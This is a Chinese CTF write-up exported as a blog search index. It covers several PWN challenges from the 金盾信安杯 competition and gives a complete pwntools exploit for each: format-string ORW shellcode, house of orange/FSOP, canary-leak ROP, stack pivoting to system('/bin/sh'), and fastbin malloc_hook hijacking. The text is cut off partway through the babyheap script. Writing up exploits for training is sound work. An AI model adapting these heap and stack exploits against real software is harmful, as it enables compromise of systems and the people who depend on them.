<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>金盾信安杯_PWN</title>
    <link href="/2024/12/02/2024-jdxa/"/>
    <url>/2024/12/02/2024-jdxa/</url>
    
    <content type="html"><![CDATA[<h1 id="2022"><a href="#2022" class="headerlink" title="2022"></a>2022</h1><h1 id="2023"><a href="#2023" class="headerlink" title="2023"></a><font style="color:rgb(36, 41, 46);">2023</font></h1><h2 id="sign-format"><a href="#sign-format" class="headerlink" title="sign-format"></a><font style="color:rgb(36, 41, 46);">sign-format</font></h2><blockquote><p>题源：<font style="color:rgb(36, 41, 46);">sign-format</font></p><p>考点：shellcode（&#x2F;orw）+ <font style="color:#DF2A3F;">bss段</font><strong><font style="color:#DF2A3F;">format_string</font></strong> + 篡改<font style="color:#DF2A3F;"><strong>exit() 执行时的 dlfiini</strong></font></p></blockquote><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p>关闭了输出流，存在非栈上格式化字符串漏洞。</p><p><img src="/images/1.png"><br>写入地址具有可执行权限。</p><p><img src="/images/2.png"></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><strong><font style="color:#DF2A3F;">思路</font></strong>：在bss段布置shellcode，劫持程序执行流转到输入地址。</p><p><strong><font style="color:#601BDE;">具体</font></strong>：<strong>在bss段布置来实现执行shellcode（orw）的跳板，之后</strong><font style="color:#DF2A3F;"><strong>修改dl_fini的rsi偏移来指向orw执行的地址</strong></font>即可，后续程序执行到 exit() 退出时候会读出flag。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>,arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>r=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>s= shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./flag&quot;</span>,<span class="hljs-number">0</span>)<br>s+= shellcraft.read(<span class="hljs-number">1</span>,<span class="hljs-number">0x4040b0</span> + <span class="hljs-number">0x100</span>,<span class="hljs-number">0x100</span>)<br>s+= shellcraft.write(<span class="hljs-number">2</span>,<span class="hljs-number">0x4040b0</span> + <span class="hljs-number">0x100</span>,<span class="hljs-number">0x100</span>)<br><span class="hljs-comment">#------------------------不懂-----------------------------</span><br>p = <span class="hljs-string">b&quot;%776c%30$hn&quot;</span>   <span class="hljs-comment"># 776 = 0x308</span><br>p = p.ljust(<span class="hljs-number">0x40</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>p += p64(<span class="hljs-number">0x4040b8</span>)<br>p += <span class="hljs-string">b&quot;\x90&quot;</span>*<span class="hljs-number">0x10</span><br><span class="hljs-comment">#-----------------------------------------------------</span><br>p += asm(s)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(p))<br>r.sendafter(<span class="hljs-string">b&quot;Let&#x27;s start!\n&quot;</span>,p)<br>r.interactive()<br></code></pre></td></tr></table></figure><h1 id="2024"><a href="#2024" class="headerlink" title="2024"></a>2024</h1><h2 id="⭐orange"><a href="#⭐orange" class="headerlink" title="⭐orange"></a>⭐orange</h2><blockquote><p>考点： house of orange &amp;&amp; FSOP</p><p>注意点：libc_2.23 ，本地调试看不到预期结果【最好使用 Ubuntu16.04 尝试，否则看不了结构体….】</p></blockquote><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><p>分析附件源码发现没有dele功能，并且根据题目不难猜到考察house of orange打法。查看edit功能发现输入字节数可控，并且没有对size进行检验，存在溢出漏洞。</p><p>满足 house_of_orange 的条件：堆溢出能修改 topchunk size ；申请 size 限制范围大；没有 free 功能。当topchunk 不能满足申请分配的大小时，topchunk 被释放进 unsortedbin ，可以实现没有 free 函数释放堆块。</p><p><img src="/images/3.png"></p><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><pre><code class="hljs">思路：首先任意申请一个堆块，然后对它进行edit,利用堆溢出漏洞篡改topchunk的size值，将其改为一个较小的数。并且new_topchunk_size + chunk_0_size需要满足页对齐，即size总和为0x1000的倍数，这样就能绕过堆空间扩展时的检验。  接着申请一个大堆块满足chunk_1_size &gt; top_chunk_size，这样top_chunk就会被放到unsortedbin中，实现无free释放堆块。然后申请一个largebin范围的堆块，使得unsortedbin中的old_topchunk被分割，剩余部分进入largebins。并且堆块内部有残留的heap_addr和main_arena地址信息，进而show可以泄露得到libc_base和heap_addr，然后利用相对偏移计算得到_IO_list_all地址和system函数地址。  最后借助unsortedbin_attack劫持_IO_list_all达成FSOP利用。可以将_IO_list_all写值为main_arean+88显然，main_arena+88处的内容不是我们可以自由控制的，现在，假设我们将main_arena+88处看成是一个 IO_FILE结构体，那么struct_IO_FILE *_chain;指针的地址为:main_arena+88+0x68 = main_arena + 0xC0而main_arena + 0xC0存储着的是0x60大小的small bin第一个chunk的地址，所以我们要让我们伪造的堆块加入到 0x60的 small bin 中即可完成调用。而glibc并没有对堆块做太多的检测，只比较的 size，因此可以直接利用上述堆溢出修改size。然后伪造_IO_list_all结构，覆盖其overflow指针为目标函数，覆盖_IO_list_all指针为可控地址，最后触发程序错误或退出程序即可得到shell。</code></pre><p><img src="/images/4.png"></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ini</span>(<span class="hljs-params">name,os,arch</span>):<br>    elf = ELF(name)<br>    context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = os,arch = arch)<br><span class="hljs-comment">#io = process(&#x27;./Orange&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;114.55.67.167&#x27;</span>,<span class="hljs-string">&#x27;53544&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,data</span>):<br>    io.sendafter(<span class="hljs-string">b&#x27;&gt;&gt;\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>    io.sendafter(<span class="hljs-string">b&#x27;\n&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    io.sendafter(<span class="hljs-string">b&#x27;\n&#x27;</span>,data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,data</span>):<br>    io.sendafter(<span class="hljs-string">b&#x27;&gt;&gt;\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>    io.sendafter(<span class="hljs-string">b&#x27;\n&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>    io.sendafter(<span class="hljs-string">b&#x27;\n&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    io.sendafter(<span class="hljs-string">b&#x27;\n&#x27;</span>,data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    io.sendafter(<span class="hljs-string">b&#x27;&gt;&gt;\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>    io.sendafter(<span class="hljs-string">b&#x27;\n&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>ini(<span class="hljs-string">&#x27;./Orange&#x27;</span>,<span class="hljs-string">&#x27;linux&#x27;</span>,<span class="hljs-string">&#x27;amd64&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(io)</span><br><span class="hljs-comment">#pause()</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0xfe1</span>))  <span class="hljs-comment"># 这里需要页对齐，0xfe0+0x20 = 0x1000</span><br>add(<span class="hljs-number">0x1000</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x8</span>)<br>add(<span class="hljs-number">0x400</span>,<span class="hljs-string">b&#x27;C&#x27;</span>*<span class="hljs-number">0x8</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>show(<span class="hljs-number">2</span>)<br>io.recvuntil(<span class="hljs-string">b&#x27;C&#x27;</span>*<span class="hljs-number">8</span>)<br>leak = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;leak==&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(leak))<br>_IO_list_all = leak+<span class="hljs-number">0x8</span>+<span class="hljs-number">0x390</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;_IO_list_all==&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(_IO_list_all))<br>libc_base = leak-<span class="hljs-number">0x3c5188</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_base==&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(libc_base))<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;C&#x27;</span>*<span class="hljs-number">0x10</span>)<br>show(<span class="hljs-number">2</span>)<br>io.recvuntil(<span class="hljs-string">b&#x27;C&#x27;</span>*<span class="hljs-number">16</span>)<br>heap_leak = u64(io.recvline(keepends=<span class="hljs-literal">False</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x20</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;heap_leak==&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(heap_leak))<br>target = elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>target = libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>payload=<span class="hljs-string">b&#x27;f&#x27;</span>*<span class="hljs-number">0x400</span><br>payload1=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="hljs-number">0x61</span>) <br><span class="hljs-comment">#old top chunk prev_size &amp; size 同时也是fake file的_flags字段</span><br>payload1+=p64(<span class="hljs-number">0</span>)+p64(_IO_list_all-<span class="hljs-number">0x10</span>)   <span class="hljs-comment">#old top chunk fd &amp; bk</span><br>payload1+=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)            <span class="hljs-comment">#_IO_write_base &amp; _IO_write_ptr</span><br>payload1 = payload1.ljust(<span class="hljs-number">0xc0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload1 += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload1+=p64(heap_leak+<span class="hljs-number">0x508</span>)      <span class="hljs-comment">#作为vtable_start_addr</span><br><span class="hljs-comment">#               即该填充数据所在地址</span><br>payload1+=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(target)   <span class="hljs-comment">#DUMMY finish overflow</span><br>payload += payload1<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">0x820</span>,payload)<br>io.sendafter(<span class="hljs-string">b&#x27;&gt;&gt;\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>io.interactive()<br><br><span class="hljs-comment">#flag&#123;7452803d-f868de57-9651234-2e000b1e&#125;</span><br></code></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.yuque.com/yamaoto/hdazpl/hf2y5k">house of orange</a></p><p><a href="https://www.anquanke.com/post/id/218887#h3-4">House of orange-安全客 - 安全资讯平台</a></p><p><a href="https://bbs.kanxue.com/thread-280167.htm">堆利用详解：the house of orange-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></p><h2 id="green"><a href="#green" class="headerlink" title="green"></a>green</h2><blockquote><p>32 位 fmt + 构造函数执行流</p></blockquote><h3 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h3><p>分析源码发现存在gets栈溢出漏洞，并且由于printf函数直接以s作为参数导致格式化字符串漏洞，可以泄露程序基地址和canary值。</p><p><img src="/images/5.png"></p><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>首先利用第一个gets和printf泄露canary地址和程序基地址，然后加上偏移即可得到程序代码真实地址。由于存在栈溢出，并且发现flag输出函数：</p><p><img src="/images/6.png"></p><p>因此只需要控制程序执行流<font style="color:#DF2A3F;"><strong>依次给check1，check2，check3，finalcheck函数传递指定参数</strong></font>满足要求即可。<font style="color:#DF2A3F;"><strong>Finalcheck函数放在最后执行即可获取shell</strong></font>。由于main函数地址已知，32位程序使用栈传递参数，而且执行流过长不易一次执行，因此<font style="color:#601BDE;"><strong>依次跳转到main函数作为缓冲</strong></font>，一一赋值即可。</p><p>运行结果如下：</p><p><img src="/images/7.png"></p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#io = process(&#x27;./green&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;114.55.67.167&#x27;</span>,<span class="hljs-number">50564</span>)<br>p = io<br>elf = ELF(<span class="hljs-string">&#x27;./green&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(io)</span><br><span class="hljs-comment">#pause()</span><br>offset = <span class="hljs-number">0x4</span>*<span class="hljs-number">8</span> <br>payload = <span class="hljs-string">b&#x27;%3$p-%15$p&#x27;</span>  <span class="hljs-comment"># base_addr+0x2f1 , canary_addr</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;Every protection is enabled. Good luck.\n&#x27;</span>,payload)<br>base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">10</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x2f1</span><br>io.recvuntil(<span class="hljs-string">b&#x27;-&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(io.recvline(keepends=<span class="hljs-literal">False</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary==&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(canary))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;base===&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(base))<br>func = <span class="hljs-number">0x342</span> + base<br>check1 = <span class="hljs-number">0x20d</span> + base<br>check2 = <span class="hljs-number">0x226</span> + base<br>check3 = <span class="hljs-number">0x23f</span> + base<br>flag = <span class="hljs-number">0x258</span> + base<br>ebx = <span class="hljs-number">0x1022</span> + base<br>main = base + <span class="hljs-number">0x365</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*offset + p32(canary) + p32(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> +  p32(check1) + p32(main) + p32(<span class="hljs-number">0x1337</span>) <br>p.sendline(payload)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*offset + p32(canary) + p32(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> +  p32(check2) + p32(main) + p32(<span class="hljs-number">0x420</span>) <br>p.sendlineafter(<span class="hljs-string">b&#x27;Every protection is enabled. Good luck.\n&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>io.recvline()<br>p.sendline(payload)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*offset + p32(canary) + p32(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> +  p32(check3) + p32(main) + p32(<span class="hljs-number">0xDEADBEEF</span>) <br>p.sendlineafter(<span class="hljs-string">b&#x27;Every protection is enabled. Good luck.\n&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>io.recvline()<br>p.sendline(payload)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*offset + p32(canary) + p32(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> +  p32(flag) + p32(main)  +  p32(<span class="hljs-number">0x123</span>)  <br>p.sendlineafter(<span class="hljs-string">b&#x27;Every protection is enabled. Good luck.\n&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>io.recvline()<br>p.sendline(payload)<br><br>io.interactive()<br><span class="hljs-comment"># flag&#123;c6f3396244adadd3c53c49cf13ca864e&#125;</span><br></code></pre></td></tr></table></figure><h2 id="stackmigration"><a href="#stackmigration" class="headerlink" title="stackmigration"></a>stackmigration</h2><blockquote><p>64 位栈迁移，栈地址可知</p></blockquote><h3 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h3><p><img src="/images/8.png"></p><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>分析程序发现给出了输入点的栈地址，并且存在栈溢出，不过溢出长度有限，需要使用栈劫持，即直接在输入缓冲区布置payload，在程序返回点填充main函数地址以便ret2libc返回再次执行，然后利用leave将rip重新劫持到输入起始位置执行payload进行泄露函数真实地址。进而得到system函数和字符串“&#x2F;bin&#x2F;sh”真实地址。</p><p>接着，由于返回地址被修改为main_addr，因此会再次执行回到vul函数，这时候布置payload，由于leave指令的作用，后续会直接让程序转向执行system（&#x2F;bin&#x2F;sh）即可获得shell。</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>,arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#io = process(&#x27;./stack_migration&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;114.55.67.167&#x27;</span>,<span class="hljs-string">&#x27;54668&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./stack_migration&#x27;</span>)<br><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>ret  = <span class="hljs-number">0x000000000040065e</span><br>leave = <span class="hljs-number">0x0000000000400896</span><br>pop_rdi =  <span class="hljs-number">0x0000000000400963</span><br>offset = <span class="hljs-number">0x20</span><br><span class="hljs-comment">#gdb.attach(io)</span><br><span class="hljs-comment">#pause()</span><br>io.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br><br>stack = <span class="hljs-built_in">int</span>((io.recv(<span class="hljs-number">12</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br><br>p1 =  p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)<br>p1 += p64(stack-<span class="hljs-number">0x8</span>) + p64(leave)<br><br>io.sendafter(<span class="hljs-string">b&#x27;Do you still have something to say?\n&#x27;</span>,p1)<br><br>puts = u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts===&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(puts))<br><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>libc_base = puts-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>sys = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br><span class="hljs-built_in">bin</span> = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br><br>io.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>stack = <span class="hljs-built_in">int</span>((io.recv(<span class="hljs-number">12</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;stack===&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(stack))<br>p2 = (p64(pop_rdi) + p64(<span class="hljs-built_in">bin</span>) + p64(sys)).ljust(offset,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>p2 += p64(stack-<span class="hljs-number">0x8</span>) +p64(leave)<br>io.sendafter(<span class="hljs-string">b&#x27;Do you still have something to say?\n&#x27;</span>,p2)<br><br>io.interactive()<br><span class="hljs-comment"># flag&#123;9bfc04fc-f4dd8d28-77a0b2b6-24867e58&#125;</span><br></code></pre></td></tr></table></figure><h2 id="babyheap"><a href="#babyheap" class="headerlink" title="*babyheap"></a>*babyheap</h2><h3 id="源码-4"><a href="#源码-4" class="headerlink" title="源码"></a>源码</h3><p><img src="/images/9.png"></p><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>分析源码发现程序实现了增删改查四种功能，并且最多申请16个chunk，每个chunk大小不超过0x510。由于程序依赖libc版本为2.23，因此考虑使用unsortedbin attack，fastbin atack。</p><p>首先申请几个堆块，其中一个小chunk被两个大chunk夹着，然后通过释放前一个chunk，伪造后一个chunk的pre_size和pre_use标志位，然后再释放，绕过检测机制使得这三个chunk均被放入unsortedbin，利用show(1)泄露libc基地址，进而得到malloc_hook和realloc地址。利用fastbin_attack劫持fd指针，申请得到malloc_hook上方堆块，通过修改该堆块内容，将malloc_hook篡改为one_gadget。最后触发malloc_hook即可成功shell。</p><p>运行结果：<br><img src="/images/10.png"></p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br><br>local_file  = <span class="hljs-string">&#x27;./babyheap&#x27;</span><br>elf = ELF(local_file)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data)<br>sa     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)<br>sl     = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)<br>sla    = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)<br>r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)<br>ru     = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)<br>uu32   = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64   = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span 